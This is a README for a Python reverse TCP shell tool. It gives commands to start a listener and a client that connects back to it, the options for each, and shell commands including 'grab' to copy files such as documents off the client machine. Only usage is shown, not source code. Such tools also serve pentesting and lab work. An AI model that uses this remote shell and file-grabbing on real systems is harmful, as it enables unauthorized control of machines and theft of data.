## Python Reverse TCP Shell ##

### Overview

Running the server:

    ./reverse_tcp_server.py --host 10.0.0.34 --port 4444
    
This will start the server and bind it to listen on port 4444 at 10.0.0.34.  Make sure to set the host field to your IP address.

Running the client:

    ./reverse_tcp_client.py --host 10.0.0.34 --port 4444
    
This will initiate an outbound tcp connection to 10.0.0.34:4444.  These settings should identically mimic the reverse_tcp_client.py settings.

Once the client has connected to the server, you will see the prompt `Shell>` on the server.
### Options:
 
Server:  
    
    Usage: reverse_tcp_server.py [OPTIONS] 
        --host TEXT     the IP address to listen on
        --port INT      the port to listen on
        --dest TEXT     The directory destination to put files from `grab`
        --struct        A flag to signify whether to save files with orig dir structure
        
Client:

    Usage: reverse_tcp_client.py [OPTIONS]
        --host TEXT     the IP address of the shell server
        --port INT      the port address of the shell server

### Usage

Exit the shell and terminate the connections

    Shell> terminate
    
Copy the file foo.txt from the local directory on the client side

    Shell> grab foo.txt
    
Copy the file foo.pdf from an absolute location on the client

    Shell> grab /home/user/Documents/foo.pdf

You can execute any system level command that the client machine supports via the shell.  Additionally, there are some commands built into the shell itself that can be used.

 * `terminate` -- This command disconnects the server and client and closes both processes
 * `grab` -- This command is used to copy a file from the server to your system over the shell
